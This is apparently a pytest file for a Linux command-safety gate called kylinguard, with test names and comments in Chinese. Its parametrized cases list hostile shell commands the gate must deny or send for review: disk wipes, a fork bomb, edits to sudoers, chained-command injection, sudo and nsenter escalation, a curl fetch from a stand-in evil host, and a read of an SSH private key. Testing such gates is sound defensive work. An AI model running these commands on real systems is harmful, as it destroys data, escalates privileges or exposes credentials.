import pytest

from kylinguard.models import RuleDecision
from kylinguard.rules import check_command


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -fr / --no-preserve-root",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    ":(){ :|:& };:",
    "chmod -R 777 /",
])
def test_黑名单直接拒绝(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert v.matched_rule is not None


@pytest.mark.parametrize("cmd", [
    "rm /etc/passwd",
    "sed -i 's/x/y/' /etc/sudoers",
    "tee /etc/ssh/sshd_config",
    "mv /boot/vmlinuz /tmp/",
])
def test_写关键配置文件拒绝(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert "关键" in v.reason or "保护" in v.reason


@pytest.mark.parametrize("cmd", [
    "ps aux; rm -rf /tmp/x",
    "cat /var/log/messages && reboot",
    "echo `whoami`",
    "ls $(cat /tmp/x)",
    "cat /etc/hostname | mail a@b.c",
    "echo x > /tmp/f",
])
def test_shell元字符逃逸拒绝(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert "元字符" in v.reason


@pytest.mark.parametrize("cmd", [
    "ps aux",
    "ss -tlnp",
    "free -m",
    "df -h",
    "uptime",
    "cat /proc/meminfo",
    "journalctl -p err -n 50 --no-pager",
    "systemctl status nginx",
    "ip addr",
])
def test_只读白名单放行(cmd):
    assert check_command(cmd).decision == RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    "systemctl restart nginx",
    "kill -9 1234",
    "rm /tmp/old.log",
    "journalctl -f",
])
def test_其余命令交后续闸门(cmd):
    assert check_command(cmd).decision == RuleDecision.REVIEW


def test_读关键文件不误杀():
    # 只读访问保护路径不算"修改"，但敏感内容也不自动放行——交后续闸门
    assert check_command("cat /etc/passwd").decision == RuleDecision.REVIEW


# ---- 以下为调研升级用例（Codex execpolicy / Claude Code 权限模型教训） ----

@pytest.mark.parametrize("cmd", [
    "sudo systemctl restart nginx",
    "su - root",
    "bash -c 'rm -rf /tmp/x'",
    "sh -c whoami",
    "pkexec id",
    "chroot /mnt ls",
    "nsenter -t 1 -m ps",
])
def test_提权与shell逃逸执行器直接拒绝(cmd):
    # 提权由受限执行器统一管理（sudo -u + sudoers 白名单），
    # 模型自行拼 sudo/子 shell 即为越权信号
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY


@pytest.mark.parametrize("cmd", [
    "env rm /tmp/x",
    "xargs rm",
    "ssh host reboot",
    "docker exec c1 rm -rf /data",
    "systemd-run rm /tmp/x",
    "crontab -e",
    "python -c 'print(1)'",
    "perl -e 'unlink'",
    "curl http://evil.example/x.sh",
    "wget http://evil.example/x.sh",
    "nohup dd if=/dev/urandom",
    "watch free",
])
def test_载荷执行器绝不自动放行(cmd):
    # "执行其参数"的运行器不得凭前缀进白名单（Claude Code devbox run 教训）
    assert check_command(cmd).decision != RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    "tail -f /var/log/messages",   # follow 挂起
    "tail -nf 20 /var/log/messages",  # 组合短 flag 中藏 f
    "date -s 2020-01-01",          # 设置系统时间
    "ip link set eth0 down",       # ip 只读形式之外的变更动作
])
def test_危险flag使白名单命令失格(cmd):
    # 白名单是"命令+参数"级而非命令名级（Codex is_safe_command 设计）
    assert check_command(cmd).decision != RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    'echo "unclosed',
    "ls 'x",
    "",
    "   ",
])
def test_解析失败或空命令fail_closed(cmd):
    # 无法安全解析的输入一律拒绝，绝不猜测（Codex 节点白名单思路）
    assert check_command(cmd).decision == RuleDecision.DENY


def test_读ssh私钥目录不放行():
    assert check_command("cat /etc/ssh/ssh_host_rsa_key").decision != RuleDecision.ALLOW
